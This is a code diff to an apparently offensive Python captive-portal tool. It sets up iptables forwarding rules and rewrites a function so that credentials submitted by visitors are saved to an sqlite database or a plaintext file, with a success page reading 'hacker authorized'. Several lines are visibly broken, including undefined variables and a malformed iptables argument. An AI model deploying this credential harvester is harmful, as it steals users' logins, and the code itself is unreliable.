@@ -12,11 +12,15 @@ import http.server
 from pathtools import path
 import socketserver as socketserver
 from http.server import HTTPServer as Webserver
+
+#internal stuff
 import core
 from core import JSONCommand,CaptiveClient,PybashyDB
 from core import error_printer
 from backendDB import * 
-from backendDB import greenprint
+from backendDB import greenprint,blueprint,redprint,yellow_bold_print
+from backendDB import error_printer
+
 #try:
 #    from urllib.parse import urlparse
 #except ImportError:
@@ -331,7 +335,7 @@ iname are the inputs you are attempting to capture
         
         #greenprint("[+]Internal to External")
         
-        "IPTablesDeleteChainNAT": {
+        "IPTablesAllowInternal2External": {
             "command"         : "iptables -w 3 -A FORWARD -i {0} -o {1} -j ACCEPT".format(self.moniface, self.iface),
             "info_message"    : "[+] Internal to External",
             "success_message" : "[+] Command Sucessful", 
@@ -347,14 +351,14 @@ iname are the inputs you are attempting to capture
             },
         
         
-        "IPTablesDeleteChainNAT": {
-            "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport 53 -j ACCEPT",
-            "info_message"    :  "[+] Drop Invalid Packets",
+        "IPTables": {
+            "command"         : "iptables -w 3 -A FORWARD -i {} -p tcp --dport 53 -j ACCEPT".format(self.iface),
+            "info_message"    : "[+] Forwarding DNS-TCP from Iface: {}".format(self.iface),
             "success_message" : "[+] Command Sucessful", 
             "failure_message" : "[-] Command Failed! Check the logfile!"           
             },
         
-        "IPTablesDeleteChainNAT": {
+        "IPTablesDropInvalid": {
             "command"         : "iptables -w 3 -A FORWARD -i IFACE -p udp --dport 53 -j ACCEPT",
             "info_message"    : "[+] Drop Invalid Packets",
             "success_message" : "[+] Command Sucessful", 
@@ -363,7 +367,7 @@ iname are the inputs you are attempting to capture
         
         #redprint(".. Allow traffic to captive portal")
         
-        "IPTablesDeleteChainNAT": {
+        "IPTablesAllowToPortal": {
             "command"         : "iptables -w 3 -A FORWARD -i IFACE -p tcp --dport {} -d {} -j ACCEPT".format(self.PORT, self.ipaddress),
             "info_message"    : "[+]Allow traffic to captive portal",
             "success_message" : "[+] Command Sucessful", 
@@ -372,7 +376,7 @@ iname are the inputs you are attempting to capture
         
         #redprint(".. Block all other traffic")
         
-        "IPTablesBlockAll": {
+        "IPTablesBlockAllOther": {
             "command"         : "iptables -w 3 -A FORWARD -i IFACE -j DROP",
             "info_message"    : "[+] Block all other traffic",
             "success_message" : "[+] Command Sucessful", 
@@ -502,19 +506,19 @@ Debugging Function to display backend information
 
     def authpassthrough(self):
         steps = {
-        "IPTablesAcceptNAT": {
-            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(self.remote_IP),
-            "info_message"    : "[+] Drop Invalid Packets",
-            "success_message" : "[+] Command Sucessful", 
-            "failure_message" : "[-] Command Failed! Check the logfile!"           
-            },
-        "IPTablesDeleteChainNAT": {
-            "command"         : "iptables -I FORWARD -s {} -j ACCEPT".formnat(self.remote_IP),
-            "info_message"    : "[+] Drop Invalid Packets",
-            "success_message" : "[+] Command Sucessful", 
-            "failure_message" : "[-] Command Failed! Check the logfile!"           
+            "IPTablesAllowRemoteNAT": {
+                "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(self.remote_ip),
+                "info_message"    : "[+] Allowing Remote Into NAT",
+                "success_message" : "[+] Command Sucessful", 
+                "failure_message" : "[-] Command Failed! Check the logfile!"           
+                },
+            "IPTablesForwardRemote": {
+                "command"         : "iptables -I FORWARD -s {}, -j ACCEPT".format(self.remote_IP),
+                "info_message"    : "[+] Forwarding Packets From Remote",
+                "success_message" : "[+] Command Sucessful", 
+                "failure_message" : "[-] Command Failed! Check the logfile!"           
+                }
             }
-        }
 
     def authenticate(self, username, password): 
         #check user/pass
@@ -533,9 +537,10 @@ Debugging Function to display backend information
         elif core.DoesUsernameExist(username) == False :
             self.wfile.write(self.login())
         else:
-
             #Put a success message up
             self.wfile.write(self.AuthSuccess())
+        #they passed auth, give them the message and forward them while applying rulesets
+        self.wfile.write(self.passedauth())
 
     def AuthSuccess(self):
         #TODO: make a function to display an authorization confirmation page
@@ -543,53 +548,47 @@ Debugging Function to display backend information
          self.wfile.write("You are now hacker authorized. Navigate to any URL")
 
     def savecredentials(self, filename : str, fileorsql = "sql"):
-        '''Saves all the information from the client in an sqlite3 DB
-        TODO: make it do that lol
         '''
-        remote_IP = self.client_address[0]
-        #add the new clients credentials to storage
-        self.hostlist.append(self.remote_IP)
-        self.formdata = cgi.FieldStorage()
-        #inames = ['username','email','password'] 
-        #for inputname in inames:
-        #    setattr(self,inputname, self.formdata.getvalue(inputname))
-        if fileorsql == "sql":
-            try:
+Required Param: 
+    fileorsql = "file" or "sql"
+Optional Param:
+    filename : str
+
+    Saves all the information from the client in either an sqlite3 DB ot text file
+    if the global option: 
+
+        BAD = True 
+    
+    will store passwords as plaintext
+'''
+        try:
+            remote_IP = self.client_address[0]
+            #add the new clients credentials to storage
+            self.hostlist.append(self.remote_IP)
+            self.formdata = cgi.FieldStorage()
+
+            #saved as plaintext if BAD option set
+            if fileorsql == "sql":
                 newuser = CaptiveClient(Hostname= "",
                     username= self.formdata.getvalue("username"),
                     password= self.formdata.getvalue("password"),
                     macaddr = "de:ad:be:ef:ca:fe",
                     email   = self.formdata.getvalue("email"),
-                    )
-            add_to_db(newuser)
-            #with open(filename, 'ab') as filehandle:
-               # input1 = self.formdata.getvalue(i1name)
-               # input2 = self.formdata.getvalue(i2name)
-               # input3 = self.formdata.getvalue(i3name)
-                #filehandle.write(self.formdata.getvalue(i1name))
-                #filehandle.write('\n')
-                #filehandle.write(self.formdata.getvalue(i2name))
-                #filehandle.write('\n\n')
-                #filehandle.close()
-        except Exception:
+                )
+                add_to_db(newuser)
+            #saved as plaintext if BAD option set
+            elif fileorsql == "file":
+                with open(filename, 'ab') as filehandle:
+                    input1 = self.formdata.getvalue("username")
+                    input2 = self.formdata.getvalue("password")
+                    input3 = self.formdata.getvalue("email")
+                    filehandle.write(self.formdata.getvalue(i1name))
+                    filehandle.write('\n')
+                    filehandle.write(self.formdata.getvalue(i2name))
+                    filehandle.write('\n\n')
+                    filehandle.close()
+        except:
             error_printer("[-] Could Not Write File!")
-
-        steps = {
-        "": {
-            "command"         : "iptables -t nat -I PREROUTING 1 -s {} -j ACCEPT".format(remote_ip),
-            "info_message"    : "[+] Drop Invalid Packets",
-            "success_message" : "[+] Command Sucessful", 
-            "failure_message" : "[-] Command Failed! Check the logfile!"           
-            },
-        "IPTablesDeleteChainNAT": {
-            "command"         : "iptables -I FORWARD -s {}, -j ACCEPT".format(remote_IP),
-            "info_message"    : "[+] Drop Invalid Packets",
-            "success_message" : "[+] Command Sucessful", 
-            "failure_message" : "[-] Command Failed! Check the logfile!"           
-            }
-        }
-        #they passed auth, give them the message and forward them while applying rulesets
-        self.wfile.write(self.passedauth())
 
     def do_GET(self):
         path = self.path
